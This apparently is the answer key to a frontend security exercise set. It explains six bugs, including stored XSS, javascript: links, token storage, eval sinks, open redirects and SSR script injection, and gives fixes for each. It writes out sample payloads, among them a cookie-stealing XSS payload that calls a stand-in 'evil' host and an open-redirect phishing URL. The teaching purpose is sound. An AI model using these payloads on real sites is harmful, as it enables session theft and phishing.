# SOLUTIONS — 02-security-bugs

## 01 — Stored XSS via user.bio

**Class:** Stored XSS (persisted in DB → rendered to every viewer).

**Attack:** Malicious user sets bio to `<img src=x onerror="fetch('https://evil/' + document.cookie)">`. Every other user who views the profile exfils their session.

**Fix A (preferred when HTML isn't needed):**
```jsx
<div className="bio">{user.bio}</div>
```
React escapes text by default.

**Fix B (HTML bio is a product requirement):**
```jsx
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(user.bio) }} />
```

**Why input-filtering fails:** attackers use `<img onerror>`, `<svg onload>`, `<iframe srcdoc>`, base64-encoded payloads, etc. Output encoding (or output sanitization) is the right layer.

---

## 02 — XSS via href protocol

**Attack:** `user.website = "javascript:fetch('/api/delete-account', {method:'POST'})"` → user clicks → JS runs.

**`<img src="javascript:...">`?** Modern browsers don't execute `javascript:` URLs in `<img src>`. But `data:` URLs in `<img>` can still carry SVG-with-script. Validate strictly.

**Fix:**
```js
function safeUrl(url, allowed = ['http:', 'https:', 'mailto:']) {
  try {
    const u = new URL(url, window.location.origin);
    return allowed.includes(u.protocol) ? u.toString() : '#';
  } catch {
    return '#';
  }
}
```

```jsx
<a href={safeUrl(user.website)} target="_blank" rel="noopener noreferrer">
```

**`rel="noopener noreferrer"` on `target="_blank"`:** without it, the new page can read `window.opener` and navigate it to a phishing site (tabnabbing). Modern browsers default to noopener, but old browsers and older React versions don't — always set it explicitly.

---

## 03 — Auth token storage

Issues:
1. **`localStorage` token** — XSS exfilable. Use httpOnly cookie set by server.
2. **`JSON.parse(localStorage.getItem('user'))`** — throws on `null` or malformed.
3. **`r.json()` without `r.ok` check** — 4xx/5xx responses still parsed and stored as if success.
4. **No network error handling** — `fetch` rejects on network failure; promise propagates.
5. **`authedFetch` sends token to all URLs** — if `url` is third-party, leaks token.
6. **`logout` doesn't invalidate server-side** — token still valid until expiry.
7. **No CSRF mitigation** if you later switch to cookies.
8. **No refresh token** flow.
9. **`window.location = '/'`** could be exploited if `'/'` is variable (it isn't here, but pattern is risky).

**Hardened sketch:**
```js
async function safeJson(r) {
  if (!r.ok) throw new Error(`HTTP ${r.status}`);
  return r.json();
}

export async function login(email, password) {
  // Server sets httpOnly cookie, returns user only
  const r = await fetch(`${API}/login`, { method: 'POST', credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });
  return safeJson(r);
}

const ALLOWED_HOSTS = new URL(API).host;
export async function authedFetch(url, opts = {}) {
  const u = new URL(url, window.location.origin);
  if (u.host !== ALLOWED_HOSTS && u.host !== window.location.host) {
    throw new Error('Refusing to send credentials to external host');
  }
  return fetch(u, { ...opts, credentials: 'include' });
}

export async function logout() {
  await fetch(`${API}/logout`, { method: 'POST', credentials: 'include' });
  window.location.assign('/'); // assign over href avoids history weirdness
}
```

---

## 04 — eval and friends

**Three sinks:**

1. `new Function('x', `return ${formula}`)` — `formula` is a string → `new Function` evaluates it. RCE in browser.
2. `setTimeout(widgetConfig.onMountedJs, 100)` — when first arg is a string, it's eval'd. (When it's a function, it's safe — but accepting string from config is a bug.)
3. `eval(widgetConfig.expression)` — explicit eval.

**Admin-as-defense fallacy:** "Only admins can edit configs." But:
- A compromised admin account is now stored XSS against every user.
- Admins themselves are XSS'd while editing.
- Backend bugs that leak admin write access become RCE-in-browser bugs.

**Fixes:**
- Replace `formula` with a small allowlisted expression DSL (e.g., math.js with limited operators), or pre-compute on the server.
- Replace `onMountedJs` string with a function reference passed via code (not data).
- Delete the eval branch entirely.

---

## 05 — Open redirect

**Attack URL:** `https://your-app.com/login?next=https://evil.example/fake-app-page`
1. Attacker phishes user with the link.
2. User trusts your domain, signs in.
3. Your code redirects to `evil.example`.
4. Evil page mimics your app, asks user to "confirm" with their password, captures it.

**Defenses (combine):**

```js
function safeNext(next) {
  // Must be a relative path starting with single "/"
  if (typeof next !== 'string') return '/';
  if (!next.startsWith('/') || next.startsWith('//')) return '/';
  // Optional: allowlist known paths
  if (!/^\/(dashboard|settings|projects)/.test(next)) return '/';
  return next;
}
```

Or by URL parsing:
```js
try {
  const u = new URL(next, window.location.origin);
  if (u.origin !== window.location.origin) return '/';
  return u.pathname + u.search + u.hash;
} catch { return '/'; }
```

**Trap:** `//evil.com` is protocol-relative — `new URL("//evil.com", origin)` resolves to `https://evil.com`. The startsWith check above blocks it.

---

## 06 — SSR script injection

**Attack:** Set `data.user.bio = "</script><script>alert(document.cookie)</script>"`. `JSON.stringify` outputs `"</script><script>alert(document.cookie)</script>"`. The browser HTML parser sees the literal `</script>` and closes the bootstrap script — then runs the attacker's script.

`JSON.stringify` escapes `"`, `\`, control chars. It does NOT escape `<`, `>`, `/`, `&`.

**Other break-out sequences:**
- `<!--` (starts an HTML comment that swallows content)
- `<script>` (parser confused)
- `<![CDATA[` in XHTML contexts

**Fix A (escape `<`):**
```jsx
const safe = JSON.stringify(data).replace(/</g, '\\u003c');
```

**Fix B (library):** `serialize-javascript` (handles regex, dates, functions, edge cases).

**Fix C (separate channel):**
- Server sends data in a separate `<meta name="bootstrap" content="...">` (escaped as HTML attribute, naturally safer).
- Or client makes an initial `/api/bootstrap` call.

**Trade-off:** inline scripts are fastest (no extra round-trip) but require escaping. Separate fetch adds latency but isolates risk.

---

Done. Next: `03-perf-bugs/`.
